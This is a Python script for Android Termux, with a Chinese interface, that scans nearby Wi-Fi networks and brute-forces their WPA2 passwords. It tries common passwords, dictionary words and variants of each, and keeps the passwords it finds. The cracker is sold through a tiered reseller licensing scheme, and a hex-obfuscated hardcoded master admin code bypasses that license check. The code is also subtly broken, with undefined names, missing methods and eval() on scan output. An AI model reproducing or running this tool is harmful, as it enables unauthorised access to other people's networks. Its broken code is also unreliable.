#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import time
import random
import string
import gc
import subprocess
import logging
import json
from datetime import datetime, timedelta, timezone
from itertools import islice
from cryptography.fernet import Fernet
from enum import Enum

# ====== 进度条配置 ======
try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False

    class SimpleProgress:
        def __init__(self, total):
            self.total = total
            self.start = time.time()
            self.last_print = 0

        def update(self, current):
            now = time.time()
            if now - self.last_print > 1:
                elapsed = now - self.start
                rate = current / elapsed if elapsed > 0 else 0
                remain = (self.total - current) / rate if rate > 0 else 0
                print(
                    f"\r进度: {current}/{self.total} | 速度: {rate:.1f}次/秒 | 已用: {timedelta(seconds=int(elapsed))} | 剩余: {timedelta(seconds=int(remain))}",
                    end="")
                self.last_print = now

# ====== 全局配置 ======
VERSION = "7.1"
DICT_DIR = "/storage/emulated/0/aiHuanying"
AUTH_FILES = {
    'admin': os.path.join(DICT_DIR, "管理员授权码.txt"),
    'agent': os.path.join(DICT_DIR, "代理商授权码.txt"),
    'permanent': os.path.join(DICT_DIR, "永久授权码.txt"),
    'normal': os.path.join(DICT_DIR, "普通授权码.txt")
}
LOG_FILE = os.path.join(DICT_DIR, "wifi_cracker.log")
SUCCESS_DICT = os.path.join(DICT_DIR, "success_records.txt")
ENCRYPTION_KEY_FILE = os.path.join(DICT_DIR, ".wifi_key")
USAGE_FILE = os.path.join(DICT_DIR, ".usage_records")
SCAN_TIMEOUT = 15
ATTEMPT_DELAY = (1.0, 2.0)
MAX_MEMORY_CHUNK = 50000
COMMON_PASSWORDS = [
    '12345678', 'password', 'qwertyui', '88888888',
    '11111111', 'admin', '1234567890', 'abcd1234'
]

# ====== 枚举定义 ======
class UserType(Enum):
    ADMIN = ("超级管理员", "永久", 0)
    AGENT = ("代理会员", "有期限", 1)
    PERMANENT = ("尊贵会员", "永久", 2)
    NORMAL = ("普通成员", "有期限", 3)

    def __init__(self, chinese_name, expiry_type, level):
        self.chinese = chinese_name
        self.expiry_type = expiry_type
        self.level = level

# ====== 授权管理系统 ======
HIDDEN_ADMIN_CODE = bytes.fromhex('31343636323937303835').decode()


class AuthManager:
    """增强型多级授权管理系统"""

    def __init__(self):
        self.auth_codes = {}
        self.usage_records = self._load_usage_records()
        self.user_type = None
        self.expiry_time = None
        self._load_all_auth_codes()

    def _load_all_auth_codes(self):
        """按层级加载授权码（追加模式）"""
        for auth_type, file_path in AUTH_FILES.items():
            if os.path.exists(file_path):
                with open(file_path, 'r') as f:
                    for line in f:
                        code, code_type, duration = line.strip().split(',')
                        self.auth_codes[code] = (code_type, duration)

    def _load_usage_records(self):
        """加载使用记录（首次使用时间）"""
        if os.path.exists(USAGE_FILE):
            with open(USAGE_FILE, 'r') as f:
                return json.load(f)
        return {}

    def save_usage_records(self):
        """保存使用记录"""
        with open(USAGE_FILE, 'w') as f:
            json.dump(self.usage_records, f)

    def generate_code(self, target_type):
        """生成指定类型授权码并按层级写入文件"""
        try:
            count = int(input("生成数量（默认500）: ") or 500)
            duration = self._get_duration(target_type)
            codes = [self._generate_code(target_type) for _ in range(count)]

            # 写入所有符合条件的文件
            for target_file in self._get_target_files(target_type):
                with open(target_file, 'a') as f:
                    for code in codes:
                        f.write(f"{code},{target_type},{duration}\n")

            print(f"成功生成{count}个{target_type}授权码")
            return True
        except Exception as e:
            print(f"生成失败: {str(e)}")
            return False

    def _generate_code(self, code_type):
        """生成授权码（管理员码特殊处理）"""
        if code_type == 'admin':
            return HIDDEN_ADMIN_CODE
        rand = random.SystemRandom()
        if code_type == 'agent':
            # 12大写+12小写+8数字
            chars = rand.choices(string.ascii_uppercase, k=12) + \
                    rand.choices(string.ascii_lowercase, k=12) + \
                    rand.choices(string.digits, k=8)
        elif code_type == 'permanent':
            # 最多6大写+至少20小写
            upper = rand.randint(0, 6)
            lower = 32 - upper
            chars = rand.choices(string.ascii_uppercase, k=upper) + \
                    rand.choices(string.ascii_lowercase, k=lower)
        else:  # normal
            # 至少7小写
            lower = rand.randint(7, 25)
            chars = rand.choices(string.ascii_lowercase, k=lower) + \
                    rand.choices(string.ascii_uppercase + string.digits, k=32 - lower)
        rand.shuffle(chars)
        return ''.join(chars)

    def _get_duration(self, code_type):
        """获取有效期描述（包含生成时间）"""
        if code_type in ['admin', 'permanent']:
            return "永久"
        while True:
            duration = input("请输入有效期（如 30天, 1月, 2年）: ").strip()
            if re.match(r"(\d+)([天月年])", duration):
                return duration
            print("输入格式无效，请重新输入。")

    def validate_code(self, code):
        """增强版授权码验证（支持短码管理员码）"""
        if code == HIDDEN_ADMIN_CODE:
            self._set_user_type('admin')
            self.expiry_time = datetime.max.replace(tzinfo=timezone.utc)
            return True
        if code in self.auth_codes:
            code_type, duration = self.auth_codes[code]
            self._set_user_type(code_type)
            if code not in self.usage_records:
                self.usage_records[code] = datetime.now(timezone.utc).isoformat()
                self.save_usage_records()
            start_time = datetime.fromisoformat(self.usage_records[code])
            self.expiry_time = self._calculate_expiry(code_type, duration, start_time)
            return self._check_expiry()
        return False

    def _set_user_type(self, code_type):
        """映射授权码类型到用户类型"""
        type_mapping = {
            'admin': UserType.ADMIN,
            'agent': UserType.AGENT,
            'permanent': UserType.PERMANENT,
            'normal': UserType.NORMAL
        }
        self.user_type = type_mapping.get(code_type, UserType.NORMAL)

    def _calculate_expiry(self, code_type, duration, create_time):
        """根据类型和有效期计算到期时间"""
        if duration == "永久":
            return datetime.max.replace(tzinfo=timezone.utc)
        num, unit = re.match(r"(\d+)([天月年])", duration).groups()
        num = int(num)
        if unit == '天':
            return create_time + timedelta(days=num)
        elif unit == '月':
            return create_time + timedelta(days=num * 30)
        elif unit == '年':
            return create_time + timedelta(days=num * 365)

    def _check_expiry(self):
        """检查是否过期（永久用户跳过）"""
        if self.user_type in [UserType.ADMIN, UserType.PERMANENT]:
            return True
        return datetime.now(timezone.utc) < self.expiry_time

    def get_remaining_time(self):
        if self.expiry_time is None:
            return timedelta(0)
        return self.expiry_time - datetime.now(timezone.utc)


# ====== 基础功能模块 ======
class EnhancedDictManager:
    """增强型字典管理"""

    def __init__(self):
        self.available = []
        self.selected = []
        self.refresh_dicts()

    def refresh_dicts(self):
        self.available.clear()
        try:
            # 添加默认字典
            default_info = {
                'path': DEFAULT_DICT,
                'size': os.path.getsize(DEFAULT_DICT),
                'count': self._count_lines(DEFAULT_DICT),
                'name': os.path.basename(DEFAULT_DICT)
            }
            self.available.append(default_info)

            # 添加其他字典
            for fname in os.listdir(DICT_DIR):
                if fname.endswith('.txt') and fname != os.path.basename(DEFAULT_DICT):
                    path = os.path.join(DICT_DIR, fname)
                    stat = os.stat(path)
                    self.available.append({
                        'path': path,
                        'size': stat.st_size,
                        'count': self._count_lines(path),
                        'name': os.path.basename(path)
                    })
            self.available.sort(key=lambda x: -x['size'])
        except Exception as e:
            logging.error("刷新字典失败: %s", str(e))

    def _add_dict_info(self, path):
        """添加字典信息"""
        try:
            stat = os.stat(path)
            self.available.append({
                'path': path,
                'size': stat.st_size,
                'count': self._count_lines(path),
                'name': os.path.basename(path)
            })
        except:
            pass

    def _count_lines(self, path):
        """快速统计行数"""
        with open(path, 'r', errors='ignore') as f:
            return sum(1 for _ in f)

    def interactive_select(self):
        self.refresh_dicts()
        if not self.available:
            print("未找到可用字典")
            return False

        print("\n{:=^50}".format(" 字典列表 "))
        recommend = self.available[:3]
        for idx, d in enumerate(self.available, 1):
            rec_flag = "★" if d in recommend else " "
            print(
                f"{rec_flag}{idx:>2}. {d['name'][:20]:<20} {self.human_size(d['size']):>8} {d['count']:>8}条")

        while True:
            choices = input("\n请输入要使用的字典编号(推荐1-3，多个用逗号): ").strip()
            if not choices:
                choices = '1,2,3'
            try:
                selected_indices = [int(i) - 1 for i in choices.split(',')]
                valid = all(0 <= i < len(self.available) for i in selected_indices)
                if not valid:
                    raise ValueError
                self.selected = [self.available[i] for i in selected_indices]
                print("\n已选择字典：")
                for d in self.selected:
                    print(f"· {d['name']}")
                return True
            except:
                print("输入无效，请重新输入")

    @staticmethod
    def human_size(size):
        if size < 1024:
            return f"{size}B"
        elif size < 1024 ** 2:
            return f"{size / 1024:.1f}KB"
        elif size < 1024 ** 3:
            return f"{size / (1024 ** 2):.1f}MB"
        else:
            return f"{size / (1024 ** 3):.1f}GB"


class AdvancedWiFiScanner:
    """网络扫描模块"""

    def __init__(self):
        self.networks = []
        self.selected = []

    def scan(self):
        try:
            result = subprocess.run(
                ['termux-wifi-scaninfo'],
                capture_output=True,
                text=True,
                timeout=SCAN_TIMEOUT
            )
            if result.returncode == 0:
                self.networks = sorted(
                    eval(result.stdout),
                    key=lambda x: x['rssi'],
                    reverse=True
                )
                return True
            return False
        except Exception as e:
            logging.error("扫描失败: %s", str(e))
            return False

    def interactive_select(self):
        if not self.networks:
            print("请先扫描网络")
            return False

        print("\n{:=^50}".format(" 网络列表 "))
        recommend = self.networks[:3]
        print("{:<4}{:<25}{:<8}{}".format("序号", "SSID", "信号", "推荐"))
        for idx, net in enumerate(self.networks, 1):
            ssid = net['ssid'][:20].ljust(20)
            rssi = f"{net['rssi']}dBm"
            rec_flag = "★" if net in recommend else ""
            print(f"{idx:>2}. {ssid} {rssi:>8} {rec_flag:^5}")

        while True:
            choices = input("\n请输入目标编号(推荐1-3，多个用逗号): ").strip()
            if not choices:
                choices = '1,2,3'
            try:
                selected_indices = [int(i) - 1 for i in choices.split(',')]
                valid = all(0 <= i < len(self.networks) for i in selected_indices)
                if not valid:
                    raise ValueError
                self.selected = sorted(
                    [self.networks[i] for i in selected_indices],
                    key=lambda x: x['rssi'],
                    reverse=True
                )
                print("\n已选择网络：")
                for n in self.selected:
                    print(f"· {n['ssid']} ({n['rssi']}dBm)")
                return True
            except:
                print("输入无效，请重新输入")


class WiFiCrackerCore:
    """破解核心模块"""

    def __init__(self, dicts, auth_mgr):
        self.dicts = dicts
        self.auth_mgr = auth_mgr
        self.stats = {
            'total': sum(d['count'] for d in dicts),
            'attempted': 0,
            'start_time': datetime.now(timezone.utc),
            'current_ssid': None,
            'found_password': None
        }
        self.cipher = self.init_cipher()
        self.running = True

    def init_cipher(self):
        if os.path.exists(ENCRYPTION_KEY_FILE):
            with open(ENCRYPTION_KEY_FILE, 'rb') as f:
                return Fernet(f.read())
        key = Fernet.generate_key()
        with open(ENCRYPTION_KEY_FILE, 'wb') as f:
            f.write(key)
            os.chmod(ENCRYPTION_KEY_FILE, 0o600)
        return Fernet(key)

    def try_connect(self, ssid, password):
        try:
            subprocess.run(['termux-wifi-enable', 'true'],
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL,
                           timeout=5)

            result = subprocess.run(
                ['termux-wifi-connectnetwork', ssid, 'wpa2', password],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=15
            )

            check = subprocess.run(['termux-wifi-connectioninfo'],
                                   capture_output=True,
                                   text=True,
                                   timeout=5)
            return 'ssid' in check.stdout.lower() and ssid in check.stdout
        except Exception as e:
            return False

    def save_result(self, ssid, password):
        encrypted = self.cipher.encrypt(f"{ssid}|{password}".encode())
        with open(SUCCESS_DICT, 'ab') as f:
            f.write(encrypted + b'\n')
        logging.info("成功破解! SSID: %s 密码: %s", ssid, password)
        self.stats['found_password'] = password

    def generate_variants(self, base):
        return {
            base, base.upper(), base.lower(),
            base + '123', base + '!@#',
            base + '888', base[::-1]
        }

    def crack_single(self, ssid):
        logging.info("开始破解: %s", ssid)
        self.stats['current_ssid'] = ssid

        # 初始化进度条
        if HAS_TQDM:
            pbar = tqdm(total=self.stats['total'],
                        desc=f"破解 {ssid[:15]}",
                        unit="次",
                        bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [剩余: {remaining}, 速度: {rate_fmt}]")
        else:
            pbar = SimpleProgress(self.stats['total'])

        try:
            # 优先测试常见密码
            for pwd in COMMON_PASSWORDS:
                if not self.running:
                    break
                if self.try_connect(ssid, pwd):
                    self.save_result(ssid, pwd)
                    if HAS_TQDM:
                        pbar.close()
                    return True
                time.sleep(random.uniform(*ATTEMPT_DELAY))

            # 字典破解
            for dict_info in self.dicts:
                if not self.running or self.stats['found_password']:
                    break

                with open(dict_info['path'], 'r', errors='ignore') as f:
                    for line in islice(f, MAX_MEMORY_CHUNK):
                        if not self.running:
                            break

                        # 检查授权剩余时间
                        remaining = self.auth_mgr.get_remaining_time()
                        if remaining.total_seconds() <= 0:
                            print("\n授权已过期！")
                            self.running = False
                            break

                        base = line.strip()
                        for variant in self.generate_variants(base):
                            if not self.running:
                                break

                            self.stats['attempted'] += 1
                            if HAS_TQDM:
                                pbar.update(1)
                            else:
                                pbar.update(self.stats['attempted'])

                            if self.try_connect(ssid, variant):
                                self.save_result(ssid, variant)
                                if HAS_TQDM:
                                    pbar.close()
                                return True

                            # 显示动态信息
                            now = datetime.now(timezone.utc)
                            elapsed = now - self.stats['start_time']
                            remain_time = self.auth_mgr.get_remaining_time()
                            print(
                                f"\n授权剩余: {remain_time} | 身份: {self.auth_mgr.user_type.chinese} | ",
                                end="")

                            time.sleep(random.uniform(*ATTEMPT_DELAY))

                        if self.stats['attempted'] % 1000 == 0:
                            gc.collect()
        finally:
            if HAS_TQDM:
                pbar.close()

        return False

    def cleanup(self):
        self.running = False
        sys.stdout.write('\n' * 6)


class MainApp:
    def __init__(self, auth_mgr):
        self.dict_mgr = EnhancedDictManager()
        self.scanner = AdvancedWiFiScanner()
        self.cracker = None
        self.last_success = None
        self.auth_mgr = auth_mgr

    def init_ui(self):
        """初始化用户界面"""
        os.system('clear')
        print(f"""
        ██╗    ██╗██╗███████╗██╗    ██████╗ ██████╗  ██████╗ 
        ██║    ██║██║██╔════╝██║    ██╔══██╗██╔══██╗██╔════╝ 
        ██║ █╗ ██║██║█████╗  ██║    ██║  ██║██████╔╝██║  ███╗
        ██║███╗██║██║██╔══╝  ██║    ██║  ██║██╔══██╗██║   ██║
        ╚███╔███╔╝██║██║     ██║    ██████╔╝██║  ██║╚██████╔╝
         ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ 
        """)
        print(f"{'v' + VERSION:^50}")
        print("{:=^50}".format(" 仅限合法授权使用 "))

    def show_status(self):
        """显示当前状态信息"""
        status = [
            f"当前身份: {self.auth_mgr.user_type.chinese}",
            f"授权剩余: {self.auth_mgr.get_remaining_time()}",
            f"已选网络: {len(self.scanner.selected)}个" if self.scanner.selected else "未选择网络",
            f"已选字典: {len(self.dict_mgr.selected)}个" if self.dict_mgr.selected else "未选择字典"
        ]
        print("\n".join(status))

    def main_menu(self):
        """主菜单控制"""
        menu_items = [
            "1. 扫描并选择网络",
            "2. 选择密码字典",
            "3. 开始破解",
            "4. 查看历史记录",
            "5. 显示最后成功记录",
            "0. 退出程序"
        ]

        # 根据权限添加特殊菜单
        if self.auth_mgr.user_type.level <= UserType.ADMIN.level:
            menu_items.insert(4, "9. 管理员功能")
        if self.auth_mgr.user_type.level <= UserType.AGENT.level:
            menu_items.insert(4, "8. 代理商功能")

        while True:
            self.show_status()
            print("\n{:=^50}".format(" 主菜单 "))
            print("\n".join(menu_items))
            choice = input("\n请输入选项: ").strip()

            try:
                {
                    '1': self.scan_network,
                    '2': self.select_dict,
                    '3': self.start_crack,
                    '4': self.show_history,
                    '5': self.show_last_success,
                    '8': self.agent_menu,
                    '9': self.admin_menu,
                    '0': self.exit_app
                }[choice]()
            except KeyError:
                print("无效选项，请重新输入")

    def admin_menu(self):
        print("\n{:=^50}".format(" 管理员功能 "))
        print("1. 生成代理商授权码")
        print("2. 生成永久授权码")
        print("3. 生成普通授权码")
        print("4. 查看授权记录")
        print("0. 返回主菜单")

        choice = input("请输入选项: ").strip()
        if choice == '1':
            self._generate_code_with_auth('agent')
        elif choice == '2':
            self._generate_code_with_auth('permanent')
        elif choice == '3':
            self._generate_code_with_auth('normal')
        elif choice == '4':
            self.show_auth_records()
        elif choice == '0':
            return
        else:
            print("无效输入")

    def _generate_code_with_auth(self, code_type):
        if self.auth_mgr.user_type.level >= UserType[code_type.upper()].level:
            count = int(input(f"生成数量（{code_type}）: ") or 100)
            for _ in range(count):
                if self.auth_mgr.generate_code(code_type):
                    print(f"成功生成{code_type}授权码")
        else:
            print("权限不足！")

    def agent_menu(self):
        print("\n{:=^50}".format(" 代理商功能 "))
        print("1. 生成普通授权码")
        print("0. 返回主菜单")

        choice = input("请输入选项: ").strip()
        if choice == '1':
            self.auth_mgr.generate_code("normal")
        elif choice == '0':
            return
        else:
            print("无效输入")

    def generate_code(self, code_type):
        """授权码生成逻辑"""
        if not self.check_permission(code_type):
            print("权限不足！")
            return

        try:
            count = int(input(f"生成数量（{code_type}）: ") or 100)
            for _ in range(count):
                code = self.auth_mgr.generate_code(code_type)
                print(f"已生成 {code_type} 授权码: {code}")
        except ValueError:
            print("请输入有效数字")

    def check_permission(self, target_type):
        """权限验证"""
        target_level = UserType[target_type.upper()].level
        return self.auth_mgr.user_type.level <= target_level

    def show_auth_records(self):
        """显示授权记录"""
        for auth_type, file_path in AUTH_FILES.items():
            if os.path.exists(file_path):
                print(f"\n{auth_type} 授权码记录:")
                with open(file_path, 'r') as f:
                    for line in f:
                        print(line.strip())

    def clear_records(self):
        """清除历史记录"""
        if self.handle_confirm("确定要清除所有历史记录吗？(Y/n): "):
            if os.path.exists(SUCCESS_DICT):
                os.remove(SUCCESS_DICT)
            print("历史记录已清除")

    def scan_network(self):
        """网络扫描处理"""
        print("\n{:=^50}".format(" 网络扫描 "))
        if self.scanner.scan():
            self.scanner.interactive_select()
        else:
            print("扫描失败，请检查权限")

    def select_dict(self):
        """字典选择处理"""
        print("\n{:=^50}".format(" 字典选择 "))
        self.dict_mgr.interactive_select()

    def start_crack(self):
        """启动破解流程"""
        if not self._precheck():
            return

        print("\n{:=^50}".format(" 开始破解 "))
        try:
            self.cracker = WiFiCrackerCore(
                self.dict_mgr.selected,
                self.auth_mgr
            )
            self.cracker.start()
            self.last_success = self.cracker.last_success
        except KeyboardInterrupt:
            print("\n破解已中止")
        finally:
            if self.cracker:
                self.cracker.cleanup()

    def _precheck(self):
        """破解前检查"""
        if not self.scanner.selected:
            print("请先选择目标网络")
            return False
        if not self.dict_mgr.selected:
            print("请先选择密码字典")
            return False
        if self.auth_mgr.get_remaining_time().total_seconds() <= 0:
            print("授权已过期")
            return False
        return True

    def show_history(self):
        """显示破解历史"""
        if os.path.exists(SUCCESS_DICT):
            cipher = self.cracker.init_cipher()
            print("\n{:=^50}".format(" 破解历史记录 "))
            with open(SUCCESS_DICT, 'rb') as f:
                for line in f:
                    decrypted = cipher.decrypt(line.strip()).decode()
                    ssid, password = decrypted.split('|')
                    print(f"SSID: {ssid} 密码: {password}")
            print("=" * 50)
        else:
            print("暂无破解历史记录")

    def show_last_success(self):
        """显示最后成功记录"""
        if self.last_success:
            print("\n{:=^50}".format(" 最后成功记录 "))
            print(f"SSID: {self.last_success['ssid']}")
            print(f"密码: {self.last_success['password']}")
            print(f"时间: {self.last_success['time']}")
            print("=" * 50)
        else:
            print("暂无成功记录")

    def exit_app(self):
        """退出程序"""
        print("\n正在清理资源...")
        if self.cracker:
            self.cracker.cleanup()
        print("感谢使用！")
        sys.exit(0)

    def handle_confirm(self, prompt):
        resp = input(prompt).strip().lower()
        return resp in ['', 'y', 'yes']


# ====== 初始化检查 ======
def setup_environment():
    """环境初始化"""
    required_dirs = [DICT_DIR]
    required_files = {
        AUTH_FILES['admin']: "# 管理员授权码存储文件\n",
        AUTH_FILES['agent']: "# 代理商授权码存储文件\n",
        AUTH_FILES['permanent']: "# 永久授权码存储文件\n",
        AUTH_FILES['normal']: "# 普通授权码存储文件\n"
    }

    try:
        # 创建必要目录
        for d in required_dirs:
            os.makedirs(d, exist_ok=True)
            os.chmod(d, 0o700)

        # 初始化授权文件
        for path, content in required_files.items():
            if not os.path.exists(path):
                with open(path, 'w') as f:
                    f.write(content)
                os.chmod(path, 0o600)

        # 初始化加密密钥
        if not os.path.exists(ENCRYPTION_KEY_FILE):
            key = Fernet.generate_key()
            with open(ENCRYPTION_KEY_FILE, 'wb') as f:
                f.write(key)
            os.chmod(ENCRYPTION_KEY_FILE, 0o600)
    except Exception as e:
        logging.error("环境初始化失败: %s", str(e))
        sys.exit(1)


def check_dependencies():
    """依赖检查"""
    required = ['cryptography']
    missing = []
    for pkg in required:
        try:
            __import__(pkg)
        except ImportError:
            missing.append(pkg)

    if missing:
        print("正在安装缺失依赖...")
        try:
            subprocess.run([sys.executable, "-m", "pip", "install"] + missing, check=True)
            os.execl(sys.executable, sys.executable, *sys.argv)
        except Exception as e:
            logging.error("依赖安装失败: %s", str(e))
            sys.exit(1)


# ====== 主程序入口 ======
if __name__ == "__main__":
    check_dependencies()
    setup_environment()

    # 初始化日志
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s [%(levelname)s] %(message)s',
        handlers=[
            logging.FileHandler(LOG_FILE),
            logging.StreamHandler()
        ]
    )

    # 授权验证流程
    auth_mgr = AuthManager()
    print("\n{:=^50}".format(" 多级授权验证 "))

    while True:
        code = input("请输入授权码（Q退出）: ").strip()
        if code.upper() == 'Q':
            sys.exit()

        # 特殊管理员码处理
        if code == HIDDEN_ADMIN_CODE:
            if auth_mgr.validate_code(code):
                break
            continue

        # 普通授权码验证
        if len(code) == 32 and auth_mgr.validate_code(code):
            break

        print("无效的授权码！")

    print(f"\n验证通过！欢迎，{auth_mgr.user_type.chinese}")

    app = MainApp(auth_mgr)
    app.init_ui()
    app.main_menu()
